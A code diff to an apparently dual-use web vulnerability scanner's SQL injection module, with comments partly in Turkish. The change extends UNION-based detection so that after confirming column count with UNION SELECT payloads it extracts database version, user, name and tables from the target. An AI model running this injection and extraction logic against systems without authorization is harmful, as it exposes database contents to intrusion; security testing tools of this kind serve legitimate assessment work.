@@ -13,6 +13,7 @@ from websecure.scanners.base import BaseScanner
 from websecure.core.mutator import Mutator
 from websecure.core.response_analyzer import ResponseBehaviorAnalyzer, SQLErrorDetector
 from websecure.core.timing_analyzer import TimingAnalyzer
+from websecure.core.evidence_extractor import SQLiEvidenceExtractor, MARK_S, MARK_E, extract_marked
 
 logger = logging.getLogger(__name__)
 
@@ -129,55 +130,107 @@ class SQLInjectionScanner(BaseScanner):
     # Max columns to try for UNION-based probing
     _UNION_MAX_COLS = 10
 
-    def _try_union_based(self, url: str, param: str) -> Optional[Tuple[str, str]]:
+    def _try_union_based(self, url: str, param: str) -> Optional[Tuple[str, str, Dict]]:
         """
         Attempt UNION-based SQLi by probing column counts 1-N.
-        Returns (payload, evidence) if a successful UNION injection is detected.
+        Returns (payload, evidence, extracted_data) if successful.
+
+        Sandwich-marker yaklaşımı:
+          Aşama 1 — reflection guard (sahte echo'yu önle)
+          Aşama 2 — sütun sayısı probe (basit marker ile)
+          Aşama 3 — extraction: version/user/db/tables (@@WSST@@...@@WSEN@@ ile)
         """
         marker = "wsunion1337"
 
-        # Reflection control — CRITICAL false-positive guard.
-        # The marker lives INSIDE the payload string (' UNION SELECT 'wsunion1337'…).
-        # If the parameter is simply echoed back into the page (error messages,
-        # breadcrumbs, hidden fields — extremely common on WooCommerce/WordPress),
-        # the marker appears with ZERO SQL execution → a bogus "UNION-based"
-        # CRITICAL. Observed in the wild: /sepet/?add-to-cart=… reflected the
-        # payload and produced a fabricated Critical that then fed RCE attack
-        # chains. We send the marker as a PLAIN value first; if it reflects, the
-        # union signal is untrustworthy on this parameter and we bail out.
+        # --- Aşama 1: Reflection guard ---
         control = "wsrefl" + str(random.randint(10000, 99999))
         try:
             cresp = self.session.get(self.inject_param(url, param, control), timeout=10)
             if control in (cresp.text or ""):
                 logger.debug(
-                    "[SQLi] Union aborted: param %r reflects input (marker would "
-                    "echo without SQL execution) — avoiding reflection FP", param
+                    "[SQLi] Union aborted: param %r reflects input — avoiding reflection FP", param
                 )
                 return None
         except _requests.exceptions.RequestException as exc:
             logger.debug(f"[SQLi] Union reflection control failed: {exc!r}")
 
+        # --- Aşama 2: Sütun sayısı + quote tipi bul ---
+        confirmed_cols: Optional[int] = None
+        confirmed_quote: Optional[str] = None
+        confirmed_payload: Optional[str] = None
+
         for cols in range(1, self._UNION_MAX_COLS + 1):
-            # Build NULL-padded union select with our marker in pos 1
             null_cols = ["NULL"] * cols
             null_cols[0] = f"'{marker}'"
             union_str = ",".join(null_cols)
             for quote in ("'", '"', ""):
                 payload = f"{quote} UNION SELECT {union_str}-- -"
-                test_url = self.inject_param(url, param, payload)
                 try:
-                    resp = self.session.get(test_url, timeout=10)
+                    resp = self.session.get(self.inject_param(url, param, payload), timeout=10)
                     if marker in (resp.text or ""):
-                        evidence = (
-                            f"Union-based: marker '{marker}' returned in response "
-                            f"with {cols}-column UNION SELECT (plain-marker control "
-                            f"did NOT reflect — server-side execution)"
+                        confirmed_cols  = cols
+                        confirmed_quote = quote
+                        confirmed_payload = payload
+                        logger.info(
+                            "[SQLi] Union confirmed: cols=%d quote=%r url=%s param=%s",
+                            cols, quote, url, param,
                         )
-                        return payload, evidence
+                        break
                 except _requests.exceptions.RequestException as exc:
-                    logger.debug(f"[SQLi] Union probe failed for cols={cols}: {exc!r}")
-                    continue
-        return None
+                    logger.debug(f"[SQLi] Union probe failed cols={cols}: {exc!r}")
+            if confirmed_cols:
+                break
+
+        if not confirmed_cols:
+            return None
+
+        # --- Aşama 3: Sandwich-marker ile gerçek veri çıkar ---
+        # DB tipini error fingerprint'ten tahmin et (yoksa mysql varsay)
+        db_hint = self._detect_db_hint(url, param)
+        extractor = SQLiEvidenceExtractor()
+        extracted: Dict = {}
+        try:
+            extracted = extractor.extract(
+                url=url,
+                param=param,
+                session=self.session,
+                inject_fn=self.inject_param,
+                cols=confirmed_cols,
+                quote=confirmed_quote or "'",
+                db_hint=db_hint,
+            )
+        except Exception as exc:
+            logger.debug("[SQLi] Evidence extraction error: %r", exc)
+
+        summary = extractor.format_summary(extracted)
+        evidence = (
+            f"Union-based: marker '{marker}' confirmed with {confirmed_cols}-column "
+            f"UNION SELECT (reflection guard passed)"
+        )
+        if summary:
+            evidence += f" | {summary}"
+
+        return confirmed_payload, evidence, extracted
+
+    def _detect_db_hint(self, url: str, param: str) -> str:
+        """
+        Daha önce tespit edilen error fingerprint'ten DB tipini tahmin eder.
+        Bulamazsa 'mysql' döner (en yaygın).
+        """
+        try:
+            resp = self.session.get(self.inject_param(url, param, "'"), timeout=8)
+            body = (resp.text or "").lower()
+            if "ora-" in body or "oracle" in body:
+                return "oracle"
+            if "mssql" in body or "microsoft sql" in body or "sqlserver" in body:
+                return "mssql"
+            if "postgresql" in body or "pg_" in body:
+                return "postgresql"
+            if "sqlite" in body:
+                return "sqlite"
+        except Exception:
+            pass
+        return "mysql"
 
     # Boolean-blind payloads: (true_payload, false_payload)
     _BOOL_PAIRS: List[Tuple[str, str]] = [
@@ -662,7 +715,7 @@ class SQLInjectionScanner(BaseScanner):
             # Union-based detection — independent of error results
             union_result = self._try_union_based(url, param_name)
             if union_result:
-                payload, evidence = union_result
+                payload, evidence, extracted = union_result
                 self.report_finding(
                     vuln_type="SQL Injection (Union-Based)",
                     url=url,
@@ -673,6 +726,7 @@ class SQLInjectionScanner(BaseScanner):
                     detection_method="union_based",
                     verified=True,
                     confidence="confirmed",
+                    extracted_data=extracted if extracted else None,
                 )
 
             # Boolean-blind fallback — independent, always run
